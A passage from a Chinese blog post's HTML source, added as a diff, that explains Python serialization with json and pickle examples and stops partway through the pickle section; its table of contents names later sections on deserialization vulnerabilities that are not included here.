@@ -1,0 +1,789 @@
+
+  <!DOCTYPE html>
+  <html lang="zh-CN"  >
+  <head>
+  <meta charset="utf-8">
+  
+
+  
+
+  
+
+  <script>window.REIMU_CONFIG = {};window.REIMU_CONFIG.icon_font = '4552607_bq08450reo';window.REIMU_CONFIG.clipboard_tips = {"success":"复制成功(*^▽^*)","fail":"复制失败 (ﾟ⊿ﾟ)ﾂ","copyright":{"enable":false,"count":50,"content":"本文版权：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处！"}};window.REIMU_CONFIG.code_block = {"expand":true};</script>
+  
+  <title>
+    python反序列化 |
+    
+    KL
+  </title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin><link rel="preload" as="style" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7CNoto%20Serif%20SC:400,400italic,700,700italic&display=swap"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7CNoto%20Serif%20SC:400,400italic,700,700italic&display=swap" media="print" onload="this.media&#x3D;&#39;all&#39;">
+  
+    <link rel="preload" href="//at.alicdn.com/t/c/font_4552607_bq08450reo.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+  
+  
+    
+<link rel="stylesheet" href="/css/loader.css">
+
+  
+  
+    <meta name="description" content="一、序列化和反序列化Python序列化与反序列化详解（包括json和json模块详解）_python json序列化和反序列化-CSDN博客 1. 序列化是什么？序列化 (Serialization)是将对象的状态信息转换为可以存储或传输的形式的过程。 2. 反序列化是什么？反序列化 (Deserialization)是将有序的二进制序列转换成某种对象（字典，列表等）的过程。 用于进行数据序列化的">
+<meta property="og:type" content="article">
+<meta property="og:title" content="python反序列化">
+<meta property="og:url" content="http://example.com/2025/04/08/python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/index.html">
+<meta property="og:site_name" content="KL">
+<meta property="og:description" content="一、序列化和反序列化Python序列化与反序列化详解（包括json和json模块详解）_python json序列化和反序列化-CSDN博客 1. 序列化是什么？序列化 (Serialization)是将对象的状态信息转换为可以存储或传输的形式的过程。 2. 反序列化是什么？反序列化 (Deserialization)是将有序的二进制序列转换成某种对象（字典，列表等）的过程。 用于进行数据序列化的">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/images/20250408225934201.png">
+<meta property="og:image" content="http://example.com/images/20250408225950166.png">
+<meta property="og:image" content="http://example.com/images/20250408230011458.png">
+<meta property="article:published_time" content="2025-04-08T12:38:24.000Z">
+<meta property="article:modified_time" content="2025-04-08T15:01:44.038Z">
+<meta property="article:author" content="fuboy">
+<meta property="article:tag" content="python反序列化">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/images/20250408225934201.png">
+  
+  
+    <link rel="alternate" href="/atom.xml" title="KL" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/images/favicon.ico">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  <link rel="preload" href="https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+  
+  
+  
+  
+    
+<script src="https://npm.webcache.cn/pace-js@1.2.4/pace.min.js" integrity="sha384-k6YtvFUEIuEFBdrLKJ3YAUbBki333tj1CSUisai5Cswsg9wcLNaPzsTHDswp4Az8" crossorigin="anonymous"></script>
+
+  
+  
+    
+<link rel="stylesheet" href="https://npm.webcache.cn/@reimujs/aos@0.1.0/dist/aos.css">
+
+  
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+  <body>
+    
+  <div id='loader'>
+    <div class="loading-left-bg loading-bg"></div>
+    <div class="loading-right-bg loading-bg"></div>
+    <div class="spinner-box">
+      <div class="loading-taichi">
+        
+          <svg width="150" height="150" viewBox="0 0 1024 1024" class="icon" version="1.1" xmlns="https://www.w3.org/2000/svg" shape-rendering="geometricPrecision">
+            <path d="M303.5 432A80 80 0 0 1 291.5 592A80 80 0 0 1 303.5 432z" fill="var(--red-1, #ff5252)" />
+            <path d="M512 65A447 447 0 0 1 512 959L512 929A417 417 0 0 0 512 95A417 417 0 0 0 512 929L512 959A447 447 0 0 1 512 65z 
+           M512 95A417 417 0 0 1 929 512A208.5 208.5 0 0 1 720.5 720.5L720.5 592A80 80 0 0 0 720.5 432A80 80 0 0 0 720.5 592L720.5 720.5A208.5 208.5 0 0 1 512 512A208.5 208.5 0 0 0 303.5 303.5A208.5 208.5 0 0 0 95 512A417 417 0 0 1 512 95z" fill="var(--red-1, #ff5252)" />
+          </svg>
+        
+      </div>
+      <div class="loading-word">少女祈祷中...</div>
+    </div>
+  </div>
+  </div>
+  <script>
+    var time = null;
+    var startLoading = () => {
+      time = Date.now();
+      document.getElementById('loader').classList.remove("loading");
+    }
+    var endLoading = () => {
+      if (!time) {
+        document.body.style.overflow = 'auto';
+        document.getElementById('loader').classList.add("loading");
+      } else {
+        if (Date.now() - time > 500) {
+          time = null;
+          document.body.style.overflow = 'auto';
+          document.getElementById('loader').classList.add("loading");
+        } else {
+          setTimeout(endLoading, 500 - (Date.now() - time));
+          time = null;
+        }
+      }
+    }
+    window.addEventListener('DOMContentLoaded', endLoading);
+    document.getElementById('loader').addEventListener('click', endLoading);
+  </script>
+
+<div id="copy-tooltip" style="pointer-events: none; opacity: 0; transition: all 0.2s ease; position: fixed;top: 50%;left: 50%;z-index: 999;transform: translate(-50%, -50%);color: white;background: rgba(0, 0, 0, 0.5);padding: 10px 15px;border-radius: 10px;">
+</div>
+
+
+    <div id="container">
+      <div id="wrap">
+        <div id="header-nav">
+  <nav id="main-nav">
+    
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+            &#xe62b;
+          </div>
+          <a class="main-nav-link" href="/">首页</a>
+        </span>
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+            &#xe62b;
+          </div>
+          <a class="main-nav-link" href="/archives">归档</a>
+        </span>
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+            &#xe62b;
+          </div>
+          <a class="main-nav-link" href="/about">关于</a>
+        </span>
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+            &#xe62b;
+          </div>
+          <a class="main-nav-link" href="/friend">友链</a>
+        </span>
+      
+    
+    <a id="main-nav-toggle" class="nav-icon"></a>
+  </nav>
+  <nav id="sub-nav">
+    
+      <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS 订阅" target="_blank"></a>
+    
+    
+    
+  </nav>
+</div>
+<header id="header">
+  
+    <picture></picture>
+    <img fetchpriority="high" src="/../images/1737907114de8a.jpg" alt="python反序列化">
+  
+  <div id="header-outer">
+    <div id="header-title">
+      
+        
+        
+          <a href="/" id="logo">
+            <h1 data-aos="slide-up">python反序列化</h1>
+          </a>
+        
+      
+      
+        
+        <h2 id="subtitle-wrap" data-aos="slide-down">
+          
+        </h2>
+      
+    </div>
+  </div>
+</header>
+
+        <div id="content"  class="sidebar-right" >
+          <aside id="sidebar">
+  
+  
+  <div class="sidebar-wrapper wrap-sticky">
+    <div class="sidebar-wrap" data-aos="fade-up">
+      
+        <div class="sidebar-toc-sidebar"><div class="sidebar-toc">
+  <h3 class="toc-title">文章目录</h3>
+  <div class="sidebar-toc-wrapper toc-div-class" >
+      
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">1.</span> <span class="toc-text">一、序列化和反序列化</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E5%BA%8F%E5%88%97%E5%8C%96%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%9F"><span class="toc-number">1.1.</span> <span class="toc-text">1. 序列化是什么？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%9F"><span class="toc-number">1.2.</span> <span class="toc-text">2. 反序列化是什么？</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%E3%80%81JSON"><span class="toc-number">2.</span> <span class="toc-text">二、JSON</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AE%80%E4%BB%8B"><span class="toc-number">2.1.</span> <span class="toc-text">简介</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%89%E3%80%81JSON%E6%A8%A1%E5%9D%97"><span class="toc-number">3.</span> <span class="toc-text">三、JSON模块</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9B%9B%E3%80%81JSON%E6%A8%A1%E5%9D%97%E5%AE%9E%E4%BE%8B"><span class="toc-number">4.</span> <span class="toc-text">四、JSON模块实例</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-dump%E5%92%8Cdumps%E5%87%BD%E6%95%B0"><span class="toc-number">4.1.</span> <span class="toc-text">1. dump和dumps函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-load%E5%92%8Cloads%E5%87%BD%E6%95%B0"><span class="toc-number">4.2.</span> <span class="toc-text">2. load和loads函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E8%AF%BB%E5%8F%96%E5%A4%9A%E8%A1%8C%E7%9A%84JSON%E6%96%87%E4%BB%B6"><span class="toc-number">4.3.</span> <span class="toc-text">3. 读取多行的JSON文件</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%89%E3%80%81pickle%E6%A8%A1%E5%9D%97"><span class="toc-number">5.</span> <span class="toc-text">三、pickle模块</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#pickle%E6%A8%A1%E5%9D%97%E4%B8%8Ejson%E6%A8%A1%E5%9D%97%E5%AF%B9%E6%AF%94"><span class="toc-number">5.1.</span> <span class="toc-text">pickle模块与json模块对比</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#python-2-X"><span class="toc-number">5.2.</span> <span class="toc-text">python 2.X</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#python-3-X"><span class="toc-number">5.3.</span> <span class="toc-text">python 3.X</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#dump-%E4%B8%8Eload"><span class="toc-number">5.4.</span> <span class="toc-text">dump()与load()</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E"><span class="toc-number">6.</span> <span class="toc-text">反序列化漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Python%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95"><span class="toc-number">6.1.</span> <span class="toc-text">Python魔术方法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">6.2.</span> <span class="toc-text">&lt;__reduce__&gt;</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#-1"><span class="toc-number">6.3.</span> <span class="toc-text">&lt;__setstate__&gt;</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#-2"><span class="toc-number">6.4.</span> <span class="toc-text">&lt;__getstate__&gt;</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">6.5.</span> <span class="toc-text">漏洞利用</span></a></li></ol></li></ol>
+      
+  </div>
+</div>
+</div>
+        <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.jpg" data-sizes="auto" alt="fuboy" class="lazyload">
+  <div class="sidebar-author-name">fuboy</div>
+  <div class="sidebar-description">世所谓英雄者，不以挫抑而灰心，不以失败而退怯</div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div>
+    <div class="sidebar-state-number">89</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>分类</div>
+    <div class="sidebar-state-number">4</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>标签</div>
+    <div class="sidebar-state-number">66</div>
+  </div>
+</div>
+<div class="sidebar-social">
+  
+</div>
+<div class="sidebar-menu">
+  
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/" aria-label="首页"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">首页</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/archives" aria-label="归档"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">归档</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/about" aria-label="关于"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">关于</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/friend" aria-label="友链"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">友链</div>
+      </div>
+    
+  
+</div>
+</div>
+      
+      
+        <div class="sidebar-btn-wrapper" style="position:static">
+          <div class="sidebar-toc-btn current"></div>
+          <div class="sidebar-common-btn"></div>
+        </div>
+      
+    </div>
+  </div>
+
+  <div class="sidebar-widget">
+  
+  </div>
+</aside>
+
+          <section id="main"><article id="post-python反序列化" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-inner" data-aos="fade-up">
+    <div class="article-meta">
+      <div class="article-date">
+  <a href="/2025/04/08/python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" class="article-date-link" data-aos="zoom-in">
+    <time datetime="2025-04-08T12:38:24.000Z" itemprop="datePublished">2025-04-08</time>
+    <time style="display: none;" id="post-update-time">2025-04-08</time>
+  </a>
+</div>
+
+      
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/%E7%9F%A5%E8%AF%86%E7%82%B9/" data-aos="zoom-in">知识点</a>
+  </div>
+
+
+    </div>
+    <div class="hr-line"></div>
+    
+
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+      
+        <h2 id="一、序列化和反序列化"><a href="#一、序列化和反序列化" class="headerlink" title="一、序列化和反序列化"></a>一、序列化和反序列化</h2><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/Hardworking666/article/details/112725423">Python序列化与反序列化详解（包括json和json模块详解）_python json序列化和反序列化-CSDN博客</a></p>
+<h3 id="1-序列化是什么？"><a href="#1-序列化是什么？" class="headerlink" title="1. 序列化是什么？"></a>1. 序列化是什么？</h3><p><strong>序列化</strong> (Serialization)是将<strong>对象的状态信息</strong>转换为<strong>可以存储或传输的形式</strong>的过程。</p>
+<h3 id="2-反序列化是什么？"><a href="#2-反序列化是什么？" class="headerlink" title="2. 反序列化是什么？"></a>2. 反序列化是什么？</h3><p><strong>反序列化</strong> (Deserialization)是将<strong>有序的二进制序列</strong>转换成<strong>某种对象</strong>（字典，列表等）的过程。</p>
+<p>用于进行数据序列化的模块：</p>
+<table>
+<thead>
+<tr>
+<th>模块名称</th>
+<th>描述</th>
+<th>提供的api</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>json</td>
+<td>用于实现Python数据类型与通用（json）字符串之间的转换</td>
+<td>dumps()、dump()、loads()、load()</td>
+</tr>
+<tr>
+<td>pickle</td>
+<td>用于实现Python数据类型与Python特定二进制格式之间的转换</td>
+<td>dumps()、dump()、loads()、load()</td>
+</tr>
+<tr>
+<td>shelve</td>
+<td>专门用于将Python数据类型的数据持久化到磁盘，shelve是一个类似dict的对象，操作十分便捷</td>
+<td>open()</td>
+</tr>
+</tbody></table>
+<h2 id="二、JSON"><a href="#二、JSON" class="headerlink" title="二、JSON"></a>二、JSON</h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p><strong>JSON(JavaScript Object Notation, JS 对象简谱)</strong> 是一种轻量级的<strong>数据交换格式</strong>。</p>
+<p>采用完全独立于编程语言的文本格式来存储和表示数据。</p>
+<p>简洁和清晰的层次结构使得 JSON 成为理想的数据交换语言。</p>
+<p>易于人阅读和编写，同时也易于机器解析和生成，并有效地提升网络传输效率。</p>
+<p>JSON表示出来就是一个<strong>字符串</strong>，<strong>可以被所有语言读取</strong>，也可以方便地<strong>存储</strong>到磁盘或者通过网络<strong>传输</strong>。</p>
+<p>JSON不仅是标准格式，并且比XML更快，而且可以<strong>直接在Web页面中读取</strong>，非常方便。</p>
+<h2 id="三、JSON模块"><a href="#三、JSON模块" class="headerlink" title="三、JSON模块"></a>三、JSON模块</h2><p>Python3 中可以使用 json 模块来对 JSON 数据进行<strong>编解码</strong>，它主要提供了四个方法： dump、dumps、load、loads。</p>
+<p><strong>dump和dumps对python对象进行序列化</strong>。<strong>将一个Python对象进行JSON格式的编码。</strong></p>
+<p><strong>load和loads反序列化方法</strong>，<strong>将json格式数据解码为Python对象。</strong></p>
+<ul>
+<li><strong>encoding：*</strong> 把Python对象转换成JSON字符串</li>
+<li><strong>decoding：*</strong> 把JSON字符串转换成python对象</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 序列化：将Python对象转换成json字符串</span><br><span class="line">dumps(obj, skipkeys=False, ensure_ascii=True, check_circular=True, allow_nan=True, cls=None, indent=None, separators=None, default=None, sort_keys=False, **kw)</span><br><span class="line"> </span><br><span class="line"># 反序列化：将json字符串转换成Python对象</span><br><span class="line">loads(s, encoding=None, cls=None, object_hook=None, parse_float=None, parse_int=None, parse_constant=None, object_pairs_hook=None, **kw)</span><br></pre></td></tr></table></figure>
+
+<p>除此之外，json模块还提供了两个额外的方法允许我们直接将序列化后得到的json数据保存到文件中，以及直接读取文件中的json数据进行反序列化操作：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 序列化：将Python对象转换成json字符串并存储到文件中</span><br><span class="line">dump(obj, fp, skipkeys=False, ensure_ascii=True, check_circular=True, allow_nan=True, cls=None, indent=None, separators=None, default=None, sort_keys=False, **kw)</span><br><span class="line"> </span><br><span class="line"># 反序列化：读取指定文件中的json字符串并转换成Python对象</span><br><span class="line">load(fp, cls=None, object_hook=None, parse_float=None, parse_int=None, parse_constant=None, object_pairs_hook=None, **kw)</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="四、JSON模块实例"><a href="#四、JSON模块实例" class="headerlink" title="四、JSON模块实例"></a>四、JSON模块实例</h2><h3 id="1-dump和dumps函数"><a href="#1-dump和dumps函数" class="headerlink" title="1. dump和dumps函数"></a>1. dump和dumps函数</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">import json</span><br><span class="line"># dumps可以格式化所有的基本数据类型为字符串</span><br><span class="line">data1 = json.dumps([])         # 列表</span><br><span class="line">print(data1, type(data1))</span><br><span class="line">data2 = json.dumps(2)          # 数字</span><br><span class="line">print(data2, type(data2))</span><br><span class="line">data3 = json.dumps(&#x27;3&#x27;)        # 字符串</span><br><span class="line">print(data3, type(data3))</span><br><span class="line">dict = &#123;&quot;name&quot;: &quot;Tom&quot;, &quot;age&quot;: 18&#125;   # 字典</span><br><span class="line">data4 = json.dumps(dict)</span><br><span class="line">print(data4, type(data4))</span><br><span class="line"></span><br><span class="line">with open(&quot;test.json&quot;, &quot;w&quot;, encoding=&#x27;utf-8&#x27;) as f:</span><br><span class="line">  #indent 格式化保存字典，默认为None，小于0为零个空格。indent=4缩进4个空格</span><br><span class="line">  f.write(json.dumps(dict, indent=4))</span><br><span class="line">  json.dump(dict, f, indent=4)  # 传入文件描述符，和dumps一样的结果</span><br></pre></td></tr></table></figure>
+
+<p>输出为</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[] &lt;class &#x27;str&#x27;&gt;</span><br><span class="line">2 &lt;class &#x27;str&#x27;&gt;</span><br><span class="line">&quot;3&quot; &lt;class &#x27;str&#x27;&gt;</span><br><span class="line">&#123;&quot;name&quot;: &quot;Tom&quot;, &quot;age&quot;: 18&#125; &lt;class &#x27;str&#x27;&gt;</span><br></pre></td></tr></table></figure>
+
+<p>test.json中的内容：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;name&quot;</span>: <span class="string">&quot;Tom&quot;</span>,</span><br><span class="line">    <span class="string">&quot;age&quot;</span>: <span class="number">18</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="2-load和loads函数"><a href="#2-load和loads函数" class="headerlink" title="2. load和loads函数"></a>2. load和loads函数</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">import json</span><br><span class="line"></span><br><span class="line">dict = &#x27;&#123;&quot;name&quot;: &quot;Tom&quot;, &quot;age&quot;: 18&#125;&#x27;   # 将字符串还原为dict</span><br><span class="line">data1 = json.loads(dict)</span><br><span class="line">print(data1, type(data1))</span><br><span class="line"></span><br><span class="line">with open(&quot;test.json&quot;, &quot;r&quot;, encoding=&#x27;utf-8&#x27;) as f:</span><br><span class="line">    data2 = json.loads(f.read())    # load的传入参数为字符串类型</span><br><span class="line">    print(data2, type(data2))</span><br><span class="line">    f.seek(0)                       # 将文件游标移动到文件开头位置</span><br><span class="line">    data3 = json.load(f)</span><br><span class="line">    print(data3, type(data3))</span><br></pre></td></tr></table></figure>
+
+<p>运行结果如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;Tom&#x27;</span>, <span class="string">&#x27;age&#x27;</span>: <span class="number">18</span>&#125; &lt;<span class="keyword">class</span> <span class="string">&#x27;dict&#x27;</span>&gt;</span><br><span class="line">&#123;<span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;Tom&#x27;</span>, <span class="string">&#x27;age&#x27;</span>: <span class="number">18</span>&#125; &lt;<span class="keyword">class</span> <span class="string">&#x27;dict&#x27;</span>&gt;</span><br><span class="line">&#123;<span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;Tom&#x27;</span>, <span class="string">&#x27;age&#x27;</span>: <span class="number">18</span>&#125; &lt;<span class="keyword">class</span> <span class="string">&#x27;dict&#x27;</span>&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="3-读取多行的JSON文件"><a href="#3-读取多行的JSON文件" class="headerlink" title="3. 读取多行的JSON文件"></a>3. 读取多行的JSON文件</h3><p>假如要读取一个多行的JSON文件：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;坂&quot;: [&quot;坂5742&quot;]&#125;</span><br><span class="line">&#123;&quot;构&quot;: [&quot;构6784&quot;]&#125;</span><br><span class="line">&#123;&quot;共&quot;: [&quot;共5171&quot;]&#125;</span><br><span class="line">&#123;&quot;钩&quot;: [&quot;钩94a9&quot;]&#125;</span><br><span class="line">&#123;&quot;肮&quot;: [&quot;肮80ae&quot;]&#125;</span><br><span class="line">&#123;&quot;孤&quot;: [&quot;孤5b64&quot;]&#125;</span><br></pre></td></tr></table></figure>
+
+<p>如果直接使用：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(json_path, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    json_data = json.load(f)</span><br></pre></td></tr></table></figure>
+
+<p>就会报错：抛出异常<strong>JSONDecodeError</strong>。<br>表示数据错误，数据太多。</p>
+<p><strong>因为json只能读取一个文档对象</strong>，有两个解决办法：<br>1、单行读取文件,一次读取一行文件。<br>2、保存数据源的时候，格式写为一个对象。</p>
+<p>1、单行读取文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">with open(json_path, &#x27;r&#x27;) as f:</span><br><span class="line"> 	for line in f.readlines():</span><br><span class="line">        line = line.strip()   # 使用strip函数去除空行</span><br><span class="line">        if len(line) != 0:</span><br><span class="line">            json_data = json.loads(line)</span><br></pre></td></tr></table></figure>
+
+<p>2、合并为一个对象</p>
+<p>将json文件处理成一个对象文件：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;dict&quot;: [</span><br><span class="line">&#123;&quot;坂&quot;: [&quot;坂5742&quot;]&#125;,</span><br><span class="line">&#123;&quot;构&quot;: [&quot;构6784&quot;]&#125;,</span><br><span class="line">&#123;&quot;共&quot;: [&quot;共5171&quot;]&#125;,</span><br><span class="line">&#123;&quot;钩&quot;: [&quot;钩94a9&quot;]&#125;,</span><br><span class="line">&#123;&quot;肮&quot;: [&quot;肮80ae&quot;]&#125;,</span><br><span class="line">&#123;&quot;孤&quot;: [&quot;孤5b64&quot;]&#125;</span><br><span class="line">]&#125;</span><br></pre></td></tr></table></figure>
+
+<p>然后再用：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(json_path, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    json_data = json.loads(f.read())</span><br></pre></td></tr></table></figure>
+
+<h2 id="三、pickle模块"><a href="#三、pickle模块" class="headerlink" title="三、pickle模块"></a>三、pickle模块</h2><p>pickle模块实现了用于对Python对象结构进行 序列化 和 反序列化 的<strong>二进制协议</strong>，与json模块不同的是pickle模块序列化和反序列化的过程分别叫做 pickling 和 unpickling：</p>
+<ul>
+<li>*<strong>pickling：*</strong> 是将Python对象转换为字节流的过程；</li>
+<li>*<strong>unpickling：*</strong> 是将字节流二进制文件或字节对象转换回Python对象的过程；</li>
+</ul>
+<h3 id="pickle模块与json模块对比"><a href="#pickle模块与json模块对比" class="headerlink" title="pickle模块与json模块对比"></a>pickle模块与json模块对比</h3><ul>
+<li>JSON是一种文本序列化格式（它输出的是unicode文件，大多数时候会被编码为utf-8），而pickle是一个二进制序列化格式;</li>
+<li>JOSN是我们可以读懂的数据格式，而pickle是二进制格式，我们无法读懂；</li>
+<li>JSON是与特定的编程语言或系统无关的，且它在Python生态系统之外被广泛使用，而pickle使用的数据格式是特定于Python的；</li>
+<li>默认情况下，JSON只能表示Python内建数据类型，对于自定义数据类型需要一些额外的工作来完成；pickle可以直接表示大量的Python数据类型，包括自定数据类型（其中，许多是通过巧妙地使用Python内省功能自动实现的；复杂的情况可以通过实现specific object API来解决）</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"># 将指定的Python对象通过pickle序列化作为bytes对象返回，而不是将其写入文件</span><br><span class="line">dumps(obj, protocol=None, *, fix_imports=True)</span><br><span class="line"> </span><br><span class="line"># 将通过pickle序列化后得到的字节对象进行反序列化，转换为Python对象并返回</span><br><span class="line">loads(bytes_object, *, fix_imports=True, encoding=&quot;ASCII&quot;, errors=&quot;strict&quot;)</span><br><span class="line"> </span><br><span class="line"># 将指定的Python对象通过pickle序列化后写入打开的文件对象中，等价于`Pickler(file, protocol).dump(obj)`</span><br><span class="line">dump(obj, file, protocol=None, *, fix_imports=True)</span><br><span class="line"> 